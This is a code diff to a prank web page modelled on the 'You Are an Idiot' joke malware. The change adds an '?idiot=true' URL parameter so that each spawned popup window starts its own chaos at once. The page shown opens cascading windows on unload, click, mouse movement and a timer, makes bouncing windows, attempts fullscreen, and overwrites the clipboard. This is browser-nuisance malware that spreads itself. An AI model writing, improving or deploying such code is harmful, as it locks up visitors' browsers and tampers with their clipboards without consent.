@@ -50,7 +50,7 @@
 
         /* The Chaos Container (Hidden initially) */
         #chaos-container {
-            display: none; /* Hidden until button click */
+            display: none; /* Hidden until button click or URL parameter */
             position: fixed;
             top: 0;
             left: 0;
@@ -116,8 +116,13 @@
         const landingPage = document.getElementById('landing-page');
         const chaosContainer = document.getElementById('chaos-container');
         let chaosStarted = false;
+        
+        // Check if we should show the idiot page directly
+        const urlParams = new URLSearchParams(window.location.search);
+        const showIdiot = urlParams.get('idiot') === 'true';
 
-        startBtn.addEventListener('click', function() {
+        // Function to start all the chaos
+        function startChaos() {
             if (chaosStarted) return;
             chaosStarted = true;
 
@@ -143,13 +148,13 @@
 
             window.onunload = function() {
                 for (let i = 0; i < 10; i++) {
-                    window.open(window.location.href, '_blank', 'width=300,height=300');
+                    window.open(window.location.href + '?idiot=true', '_blank', 'width=300,height=300');
                 }
             };
 
             document.onclick = function() {
                 for (let i = 0; i < 5; i++) {
-                    window.open(window.location.href, '_blank', 'width=300,height=300');
+                    window.open(window.location.href + '?idiot=true', '_blank', 'width=300,height=300');
                 }
             };
 
@@ -157,7 +162,7 @@
             document.onmousemove = function() {
                 mouseMoveCount++;
                 if (mouseMoveCount % 50 === 0) {
-                    window.open(window.location.href, '_blank', 'width=300,height=300');
+                    window.open(window.location.href + '?idiot=true', '_blank', 'width=300,height=300');
                 }
             };
 
@@ -168,7 +173,7 @@
 
             // Periodic windows
             setInterval(function() {
-                window.open(window.location.href, '_blank', 'width=300,height=300');
+                window.open(window.location.href + '?idiot=true', '_blank', 'width=300,height=300');
             }, 5000);
 
             // Fullscreen attempt
@@ -196,7 +201,15 @@
                     navigator.clipboard.writeText("I AM AN IDIOT").catch(e => {});
                 }
             }, 25000);
-        });
+        }
+
+        // Start chaos immediately if the URL parameter is set
+        if (showIdiot) {
+            startChaos();
+        }
+
+        // Add event listener to the start button
+        startBtn.addEventListener('click', startChaos);
 
         function openBouncingWindows() {
             // Note: Browsers will block most of these unless pop-ups are allowed for this site
@@ -207,7 +220,7 @@
                     const left = Math.random() * (screen.width - width);
                     const top = Math.random() * (screen.height - height);
                     
-                    const newWindow = window.open(window.location.href, '_blank', `width=${width},height=${height},left=${left},top=${top}`);
+                    const newWindow = window.open(window.location.href + '?idiot=true', '_blank', `width=${width},height=${height},left=${left},top=${top}`);
                     
                     if (newWindow) {
                         let dx = (Math.random() - 0.5) * 20;
@@ -242,7 +255,7 @@
                         
                         newWindow.onunload = () => {
                             for (let j = 0; j < 3; j++) {
-                                window.open(window.location.href, '_blank', 'width=300,height=300');
+                                window.open(window.location.href + '?idiot=true', '_blank', 'width=300,height=300');
                             }
                         };
                     }
